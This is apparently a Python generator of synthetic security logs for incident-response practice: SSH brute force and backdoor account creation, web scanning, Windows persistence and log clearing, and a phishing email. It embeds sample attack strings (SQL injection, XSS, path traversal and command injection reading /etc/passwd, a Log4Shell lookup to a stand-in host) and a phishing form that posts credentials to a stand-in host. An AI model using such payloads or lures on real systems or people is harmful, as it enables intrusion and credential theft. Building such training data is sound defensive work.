#!/usr/bin/env python3
# все данные выдуманные: адреса из RFC 5737, домены из RFC 2606
# сиды фиксированные, файлы каждый раз получаются одинаковые

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

HERE = Path(__file__).resolve().parent
DAY_ONE = datetime(2026, 11, 9)
DAY_TWO = datetime(2026, 11, 10)
MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")


def write(name: str, text: str) -> None:
    (HERE / name).write_text(text, encoding="utf-8", newline="\n")
    print(f"wrote {name}: {text.count(chr(10))} lines")


# auth.log


def auth_log() -> str:
    rng = random.Random(2026)
    entries: list[tuple[datetime, str]] = []
    state = {"pid": 1400, "session": 210}

    def pid() -> int:
        state["pid"] += rng.randint(3, 40)
        return state["pid"]

    def add(when: datetime, tag: str, message: str) -> None:
        stamp = when.strftime("%Y-%m-%dT%H:%M:%S") + f".{when.microsecond:06d}+05:00"
        entries.append((when, f"{stamp} web-01 {tag}: {message}"))

    def jitter(when: datetime) -> datetime:
        return when + timedelta(microseconds=rng.randint(1000, 999000))

    def fingerprint() -> str:
        alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        return "".join(rng.choice(alphabet) for _ in range(43))

    def session(start: datetime, user: str, ip: str, method: str = "publickey", minutes: int = 25, uid: int = 1000) -> None:
        start = jitter(start)
        number = pid()
        suffix = f": ED25519 SHA256:{fingerprint()}" if method == "publickey" else ""
        add(start, f"sshd[{number}]", f"Accepted {method} for {user} from {ip} port {rng.randint(40000, 60999)} ssh2{suffix}")
        add(start + timedelta(milliseconds=180), f"sshd[{number}]",
            f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)")
        state["session"] += 1
        add(start + timedelta(milliseconds=260), "systemd-logind[812]", f"New session {state['session']} of user {user}.")
        add(start + timedelta(minutes=minutes), f"sshd[{number}]", f"pam_unix(sshd:session): session closed for user {user}")

    def sudo(when: datetime, user: str, command: str, cwd: str, tty: str = "pts/0") -> None:
        when = jitter(when)
        add(when, "sudo", f"  {user} : TTY={tty} ; PWD={cwd} ; USER=root ; COMMAND={command}")
        add(when + timedelta(milliseconds=40), "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {user}(uid=1000)")
        add(when + timedelta(seconds=rng.randint(1, 4)), "sudo", "pam_unix(sudo:session): session closed for user root")

    def failed(when: datetime, user: str, ip: str, valid: bool = True, hangup: bool = False) -> None:
        when = jitter(when)
        number = pid()
        port = rng.randint(32768, 60999)
        if not valid:
            add(when - timedelta(milliseconds=350), f"sshd[{number}]", f"Invalid user {user} from {ip} port {port}")
        prefix = "" if valid else "invalid user "
        add(when, f"sshd[{number}]", f"Failed password for {prefix}{user} from {ip} port {port} ssh2")
        if hangup:
            kind = "authenticating" if valid else "invalid"
            add(when + timedelta(milliseconds=700), f"sshd[{number}]",
                f"Connection closed by {kind} user {user} {ip} port {port} [preauth]")

    for day in (DAY_ONE, DAY_TWO):
        for hour in range(24):
            when = day + timedelta(hours=hour, minutes=17, seconds=1)
            number = pid()
            add(when, f"CRON[{number}]", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
            add(when + timedelta(seconds=1), f"CRON[{number}]", "pam_unix(cron:session): session closed for user root")
        session(day + timedelta(hours=9, minutes=5), "alice", "10.0.5.12", minutes=95)
        session(day + timedelta(hours=13, minutes=40), "alice", "10.0.5.12", minutes=50)
        sudo(day + timedelta(hours=9, minutes=12), "alice", "/usr/bin/systemctl status nginx", "/home/alice")
        sudo(day + timedelta(hours=13, minutes=52), "alice", "/usr/bin/journalctl -u nginx --since today", "/home/alice")
        for hour, minute in ((10, 15), (11, 30), (16, 45)):
            session(day + timedelta(hours=hour, minutes=minute), "deploy", "10.0.5.20", minutes=4, uid=1001)
            sudo(day + timedelta(hours=hour, minutes=minute + 1), "deploy", "/usr/bin/systemctl reload nginx", "/srv/app", "pts/1")

    session(DAY_ONE + timedelta(hours=11, minutes=2), "root", "10.0.5.12", minutes=6, uid=0)
    when = jitter(DAY_ONE + timedelta(hours=14, minutes=2))
    add(when, "sudo", "  backup : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")

    noise_users = ("admin", "test", "user", "guest", "oracle", "pi", "ubnt", "support")
    for _ in range(38):
        day = rng.choice((DAY_ONE, DAY_TWO))
        when = day + timedelta(seconds=rng.randint(0, 86399))
        ip = f"{rng.choice(('192.0.2', '198.51.100'))}.{rng.randint(100, 250)}"
        for attempt in range(rng.randint(1, 2)):
            failed(when + timedelta(seconds=3 * attempt), rng.choice(noise_users), ip, valid=False, hangup=True)

    # 01:52-01:58: с одного адреса перебирают список логинов
    spray = ("admin", "test", "oracle", "postgres", "ubuntu", "git", "ftpuser", "jenkins", "deploy", "alice", "backup")
    when = DAY_TWO + timedelta(hours=1, minutes=52, seconds=4)
    for name in spray:
        for _ in range(rng.randint(1, 2)):
            failed(when, name, "198.51.100.23", valid=name in ("deploy", "alice", "backup"))
            when += timedelta(seconds=rng.randint(9, 22))

    # 02:10-02:24: подбор пароля к deploy и root, потом удачный вход
    attacker = "203.0.113.45"
    when = DAY_TWO + timedelta(hours=2, minutes=10, seconds=3)
    for attempt in range(141):
        failed(when, "root" if attempt % 9 == 4 else "deploy", attacker, hangup=attempt % 6 == 5)
        when += timedelta(seconds=rng.randint(4, 8))
    session(DAY_TWO + timedelta(hours=2, minutes=24, seconds=40), "deploy", attacker, method="password", minutes=11, uid=1001)

    at = DAY_TWO + timedelta(hours=2, minutes=26, seconds=10)
    sudo(at, "deploy", "/usr/sbin/useradd -m -s /bin/bash svc-update", "/home/deploy", "pts/1")
    number = pid()
    add(at + timedelta(milliseconds=600), f"useradd[{number}]", "new group: name=svc-update, GID=1004")
    add(at + timedelta(milliseconds=640), f"useradd[{number}]",
        "new user: name=svc-update, UID=1004, GID=1004, home=/home/svc-update, shell=/bin/bash, from=/dev/pts/1")
    at += timedelta(seconds=21)
    sudo(at, "deploy", "/usr/sbin/usermod -aG sudo svc-update", "/home/deploy", "pts/1")
    number = pid()
    add(at + timedelta(milliseconds=500), f"usermod[{number}]", "add 'svc-update' to group 'sudo'")
    add(at + timedelta(milliseconds=520), f"usermod[{number}]", "add 'svc-update' to shadow group 'sudo'")
    at += timedelta(seconds=31)
    sudo(at, "deploy", "/usr/bin/passwd svc-update", "/home/deploy", "pts/1")
    add(at + timedelta(seconds=6), f"passwd[{pid()}]", "pam_unix(passwd:chauthtok): password changed for svc-update")
    session(DAY_TWO + timedelta(hours=2, minutes=29, seconds=15), "svc-update", attacker, method="password", minutes=14, uid=1004)
    sudo(DAY_TWO + timedelta(hours=2, minutes=30, seconds=2), "svc-update", "/usr/bin/crontab -l", "/home/svc-update", "pts/2")

    entries.sort(key=lambda item: item[0])
    lines = [line for _, line in entries]
    lines.insert(140, "2026-11-09T11:4")
    lines.insert(520, "tail: /var/log/auth.log: file truncated")
    lines.insert(521, "")
    return "\n".join(lines) + "\n"


# access.log

BROWSERS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
)
WORDLIST = (
    "/.env", "/.env.bak", "/.env.production", "/.git/config", "/.git/HEAD", "/.svn/entries", "/.aws/credentials",
    "/.ssh/id_rsa", "/.htpasswd", "/.DS_Store", "/wp-admin/", "/wp-login.php", "/xmlrpc.php", "/wp-content/debug.log",
    "/phpmyadmin/", "/pma/", "/adminer.php", "/server-status", "/actuator/health", "/actuator/env", "/phpinfo.php",
    "/info.php", "/config.php", "/config.json", "/config.yml", "/composer.json", "/composer.lock",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/test.cgi", "/backup.sql", "/db.sql", "/dump.sql",
    "/backup.zip", "/site.tar.gz", "/www.zip", "/admin/", "/administrator/", "/manager/html", "/login.php", "/old/",
    "/test/", "/tmp/", "/api/v1/users", "/api/debug", "/console", "/solr/admin/info/system",
)
PAYLOADS = (
    ("/product?id=1%27", 500),
    ("/product?id=1%27%20OR%20%271%27=%271", 200),
    ("/product?id=1%27%20UNION%20SELECT%20NULL--", 500),
    ("/product?id=1%27%20UNION%20SELECT%20NULL,NULL--", 500),
    ("/product?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL--", 500),
    ("/product?id=1%20AND%20SLEEP(5)", 500),
    ("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200),
    ("/search?q=%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E", 200),
    ("/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd", 400),
    ("/download?file=....//....//etc/passwd", 400),
    ("/download?file=%2Fproc%2Fself%2Fenviron", 400),
    ("/static/..%2F..%2F..%2Fetc%2Fpasswd", 400),
    ("/api/cart?item=1;cat%20/etc/passwd", 400),
    ("/product?id=${jndi:ldap://203.0.113.99/a}", 400),
)


def access_log() -> str:
    rng = random.Random(1110)
    entries: list[tuple[datetime, str]] = []

    def add(when: datetime, ip: str, request: str, status: int, size: int, agent: str, referer: str = "-", user: str = "-") -> None:
        stamp = f"{when.day:02d}/{MONTHS[when.month - 1]}/{when.year}:{when:%H:%M:%S} +0500"
        entries.append((when, f'{ip} - {user} [{stamp}] "{request}" {status} {size} "{referer}" "{agent}"'))

    clients = [f"{rng.choice(('192.0.2', '198.51.100'))}.{rng.randint(2, 99)}" for _ in range(46)]
    agents = {client: rng.choice(BROWSERS) for client in clients}
    weights = (2, 1, 1, 1, 1, 2, 4, 7, 10, 12, 13, 14, 14, 13, 12, 12, 13, 14, 15, 14, 12, 9, 6, 3)
    pages = (
        ("GET / HTTP/1.1", 200, 18432), ("GET /catalog HTTP/1.1", 200, 42110), ("GET /cart HTTP/1.1", 200, 9120),
        ("GET /static/css/site.css HTTP/1.1", 200, 28514), ("GET /static/js/app.js HTTP/1.1", 200, 91233),
        ("GET /favicon.ico HTTP/1.1", 200, 1150), ("GET /robots.txt HTTP/1.1", 200, 68),
        ("POST /api/cart HTTP/1.1", 200, 212), ("GET /checkout HTTP/1.1", 200, 15230),
        ("GET /old-page HTTP/1.1", 404, 153), ("GET /catalog/ HTTP/1.1", 301, 169),
    )
    for _ in range(940):
        hour = rng.choices(range(24), weights)[0]
        when = DAY_TWO + timedelta(hours=hour, seconds=rng.randint(0, 3599))
        client = rng.choice(clients)
        roll = rng.random()
        if roll < 0.34:
            request, status, size = f"GET /product/{rng.randint(100, 480)} HTTP/1.1", 200, rng.randint(21000, 39000)
        elif roll < 0.5:
            request, status, size = f"GET /static/img/p{rng.randint(100, 480)}.webp HTTP/1.1", rng.choice((200, 200, 304)), rng.randint(18000, 96000)
        elif roll < 0.6:
            request, status, size = f"GET /catalog?page={rng.randint(2, 14)} HTTP/1.1", 200, rng.randint(38000, 44000)
        else:
            request, status, size = rng.choice(pages)
        if status == 304:
            size = 0
        add(when, client, request, status, size, agents[client], "https://shop.example/catalog" if roll < 0.5 else "-")

    # 03:12: один адрес идет по словарю админок и секретных файлов
    scanner = "203.0.113.99"
    when = DAY_TWO + timedelta(hours=3, minutes=12, seconds=7)
    for path in WORDLIST:
        status, size = 404, 153
        if path == "/backup.zip":
            status, size = 200, 48211433
        elif path in ("/server-status", "/manager/html"):
            status, size = 403, 153
        add(when, scanner, f"GET {path} HTTP/1.1", status, size, "Mozilla/5.0 zgrab/0.x")
        when += timedelta(seconds=rng.randint(2, 4))

    # 03:20: тот же адрес шлет инъекции
    when = DAY_TWO + timedelta(hours=3, minutes=20, seconds=41)
    for target, status in PAYLOADS:
        add(when, scanner, f"GET {target} HTTP/1.1", status, 0 if status == 400 else rng.randint(300, 21000),
            "sqlmap/1.9.4#stable (https://sqlmap.org)")
        when += timedelta(seconds=rng.randint(3, 9))

    # 11:40: подбор пароля на форме входа, в конце редирект
    guesser = "198.51.100.177"
    when = DAY_TWO + timedelta(hours=11, minutes=40, seconds=12)
    for _ in range(64):
        add(when, guesser, "POST /login HTTP/1.1", 401, 482, "python-requests/2.32.5", "https://shop.example/login")
        when += timedelta(seconds=rng.randint(3, 7))
    add(when, guesser, "POST /login HTTP/1.1", 302, 0, "python-requests/2.32.5", "https://shop.example/login")
    add(when + timedelta(seconds=2), guesser, "GET /account HTTP/1.1", 200, 12840, "python-requests/2.32.5")

    # 14:20: платежный бэкенд лежит 4 минуты
    when = DAY_TWO + timedelta(hours=14, minutes=20, seconds=5)
    for _ in range(38):
        client = rng.choice(clients)
        add(when, client, "POST /api/checkout HTTP/1.1", 502, 166, agents[client], "https://shop.example/checkout")
        when += timedelta(seconds=rng.randint(3, 9))

    add(DAY_TWO + timedelta(hours=5, minutes=1, seconds=11), "198.51.100.9",
        "\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03", 400, 157, "-")

    entries.sort(key=lambda item: item[0])
    lines = [line for _, line in entries]
    lines.insert(73, "203.0.113.99 - - [10/Nov/2026:03:1")
    lines.insert(600, "nginx: [warn] conflicting server name \"shop.example\" on 0.0.0.0:443, ignored")
    return "\n".join(lines) + "\n"


# windows-security.json


def windows_export() -> str:
    # плоские записи, как дает сниппет powershell из README; время в utc
    rng = random.Random(4624)
    records: list[tuple[datetime, dict]] = []
    host = "ACC-WS-07.corp.example"

    def add(local: datetime, event_id: int, channel: str = "Security", **data) -> None:
        utc = local - timedelta(hours=5) + timedelta(microseconds=rng.randint(1000, 999000))
        stamp = utc.strftime("%Y-%m-%dT%H:%M:%S") + f".{utc.microsecond:06d}0Z"
        records.append((utc, {"TimeCreated": stamp, "EventID": event_id, "Computer": host, "Channel": channel, **data}))

    def logon(local: datetime, user: str, ip: str, kind: int = 3, ok: bool = True, workstation: str = "") -> None:
        data = dict(
            SubjectUserName="-", TargetUserName=user, TargetDomainName="CORP", LogonType=kind,
            IpAddress=ip, WorkstationName=workstation or "-",
        )
        if ok:
            add(local, 4624, **data)
        else:
            add(local, 4625, Status="0xc000006d", SubStatus="0xc000006a", **data)

    def process(local: datetime, user: str, image: str, command: str, parent: str) -> None:
        add(local, 4688, SubjectUserName=user, SubjectDomainName="CORP", NewProcessName=image,
            CommandLine=command, ParentProcessName=parent)

    for day in (DAY_ONE, DAY_TWO):
        for hour in (8, 12, 17):
            add(day + timedelta(hours=hour, minutes=1), 4624, SubjectUserName="ACC-WS-07$", TargetUserName="SYSTEM",
                TargetDomainName="NT AUTHORITY", LogonType=5, IpAddress="-", WorkstationName="-")
            add(day + timedelta(hours=hour, minutes=1, seconds=1), 4672, SubjectUserName="SYSTEM", SubjectDomainName="NT AUTHORITY")
        logon(day + timedelta(hours=8, minutes=52), "j.karimova", "10.0.8.31", kind=2, workstation="ACC-WS-07")
        logon(day + timedelta(hours=13, minutes=4), "j.karimova", "10.0.8.31", kind=7, workstation="ACC-WS-07")
        process(day + timedelta(hours=8, minutes=53), "j.karimova", "C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\userinit.exe")
        process(day + timedelta(hours=9, minutes=2), "j.karimova", "C:\\Program Files\\1cv8\\common\\1cestart.exe",
                "\"C:\\Program Files\\1cv8\\common\\1cestart.exe\"", "C:\\Windows\\explorer.exe")
        add(day + timedelta(hours=18, minutes=3), 4634, TargetUserName="j.karimova", TargetDomainName="CORP", LogonType=2)
    for hour, minute in ((10, 20), (15, 5), (16, 40)):
        logon(DAY_ONE + timedelta(hours=hour, minutes=minute), "Administrator", "10.0.8.10", kind=10, workstation="IT-ADM-01")
        add(DAY_ONE + timedelta(hours=hour, minutes=minute, seconds=1), 4672, SubjectUserName="Administrator", SubjectDomainName="CORP")
    logon(DAY_ONE + timedelta(hours=9, minutes=14), "j.karimova", "10.0.8.31", kind=2, ok=False, workstation="ACC-WS-07")

    # 03:05 местного: отказы сетевого входа под Administrator с чужой машины, потом успех
    intruder = "10.0.8.77"
    when = DAY_TWO + timedelta(hours=3, minutes=5, seconds=9)
    for _ in range(36):
        logon(when, "Administrator", intruder, ok=False, workstation="WS-GUEST-03")
        when += timedelta(seconds=rng.randint(4, 9))
    logon(when, "Administrator", intruder, workstation="WS-GUEST-03")
    add(when + timedelta(seconds=1), 4672, SubjectUserName="Administrator", SubjectDomainName="CORP")

    placeholder = base64.b64encode("Write-Output 'demo: this stands in for an encoded command'".encode("utf-16-le")).decode()
    process(DAY_TWO + timedelta(hours=3, minutes=12, seconds=30), "Administrator",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            f"powershell.exe -NoP -W Hidden -Enc {placeholder}", "C:\\Windows\\System32\\wsmprovhost.exe")
    add(DAY_TWO + timedelta(hours=3, minutes=14, seconds=2), 4720, SubjectUserName="Administrator",
        SubjectDomainName="CORP", TargetUserName="helpdesk2", TargetDomainName="ACC-WS-07")
    add(DAY_TWO + timedelta(hours=3, minutes=14, seconds=40), 4732, SubjectUserName="Administrator",
        SubjectDomainName="CORP", TargetUserName="Administrators", TargetDomainName="Builtin", MemberName="-",
        MemberSid="S-1-5-21-1004336348-1177238915-682003330-1124")
    add(DAY_TWO + timedelta(hours=3, minutes=21, seconds=11), 7045, channel="System", ProviderName="Service Control Manager",
        ServiceName="UpdaterSvc", ImagePath="C:\\ProgramData\\updater\\upd.exe", ServiceType="user mode service",
        StartType="auto start", AccountName="LocalSystem")
    add(DAY_TWO + timedelta(hours=3, minutes=23, seconds=48), 4698, SubjectUserName="Administrator",
        SubjectDomainName="CORP", TaskName="\\UpdaterSync")
    add(DAY_TWO + timedelta(hours=3, minutes=38, seconds=17), 1102, SubjectUserName="Administrator", SubjectDomainName="CORP")

    records.sort(key=lambda item: item[0])
    rows = [row for _, row in records]
    rows.insert(12, {"TimeCreated": "not a date", "EventID": 4624, "Computer": host, "Channel": "Security"})
    rows.insert(40, {"Computer": host, "Channel": "Security", "Message": "record without an event id"})
    return json.dumps(rows, ensure_ascii=False, indent=1) + "\n"


# suspicious.eml

HTML_BODY = """<html><body style="font-family:Arial,sans-serif;color:#222">
<p>Dear customer,</p>
<p>We noticed an unusual sign-in to your Example Bank account. To keep your money safe we have limited
the account. It will be suspended within 24 hours unless you confirm your identity.</p>
<p><a href="http://203.0.113.77/examplebank/verify.php?id=8841">https://examplebank.example/secure-login</a></p>
<p>You can also sign in to confirm from the mobile page:
<a href="http://examplebank.example.account-check.test/login">Example Bank mobile</a></p>
<p>Your statement for November is attached.</p>
<p style="color:#888;font-size:11px">Example Bank, <a href="https://examplebank.example/help">help centre</a>.
Please do not reply to this message.</p>
<img src="http://203.0.113.77/o.gif?m=8841" width="1" height="1" alt="">
</body></html>
"""

TEXT_BODY = """Dear customer,

We noticed an unusual sign-in to your Example Bank account. To keep your money safe we have limited
the account. It will be suspended within 24 hours unless you confirm your identity.

Confirm here: http://203.0.113.77/examplebank/verify.php?id=8841

Your statement for November is attached.

Example Bank
"""

ATTACHMENT = """<!doctype html>
<html><head><meta charset="utf-8"><title>Example Bank - statement</title></head>
<body>
<h3>Sign in to view your statement</h3>
<form method="post" action="http://account-check.test/collect.php">
<input name="login" placeholder="Login"> <input name="password" type="password" placeholder="Password">
<button>View statement</button>
</form>
</body></html>
"""


def suspicious_eml() -> str:
    encoded = base64.b64encode(ATTACHMENT.encode()).decode()
    wrapped = "\n".join(encoded[start:start + 76] for start in range(0, len(encoded), 76))
    return f"""Return-Path: <bounce-7731@mail.promo-sender.test>
Delivered-To: a.karimov@recipient.example
Received: from mx.recipient.example (mx.recipient.example [192.0.2.10])
\tby mailstore.recipient.example with LMTP id 4XkP2q1Zz9
\tfor <a.karimov@recipient.example>; Tue, 10 Nov 2026 09:41:19 +0500
Received: from mail.promo-sender.test (mail.promo-sender.test [203.0.113.77])
\tby mx.recipient.example with ESMTPS id 5A1C3F0E21
\tfor <a.karimov@recipient.example>; Tue, 10 Nov 2026 09:41:12 +0500
Received: from WIN-7QK2 (unknown [198.51.100.201])
\tby mail.promo-sender.test with ESMTPA id 9F3B2D11;
\tTue, 10 Nov 2026 04:41:07 +0000
Authentication-Results: mx.recipient.example;
\tspf=softfail (mx.recipient.example: domain of transitioning bounce-7731@mail.promo-sender.test does not designate 203.0.113.77 as permitted sender) smtp.mailfrom=bounce-7731@mail.promo-sender.test;
\tdkim=none (message not signed);
\tdmarc=fail (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=examplebank.example
From: "Example Bank Security" <security@examplebank.example>
Reply-To: "Example Bank" <examplebank.support@freemail.test>
To: a.karimov@recipient.example
Subject: Action required: confirm your account within 24 hours
Date: Tue, 10 Nov 2026 09:41:07 +0500
Message-ID: <20261110044107.9F3B2D11@WIN-7QK2>
X-Mailer: PHPMailer 6.9.1
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_demo_mixed_01"

--=_demo_mixed_01
Content-Type: multipart/alternative; boundary="=_demo_alt_02"

--=_demo_alt_02
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

{TEXT_BODY}
--=_demo_alt_02
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: 7bit

{HTML_BODY}
--=_demo_alt_02--

--=_demo_mixed_01
Content-Type: text/html; name="Statement_November.pdf.html"
Content-Disposition: attachment; filename="Statement_November.pdf.html"
Content-Transfer-Encoding: base64

{wrapped}

--=_demo_mixed_01--
"""


if __name__ == "__main__":
    write("auth.log", auth_log())
    write("access.log", access_log())
    write("windows-security.json", windows_export())
    write("suspicious.eml", suspicious_eml())
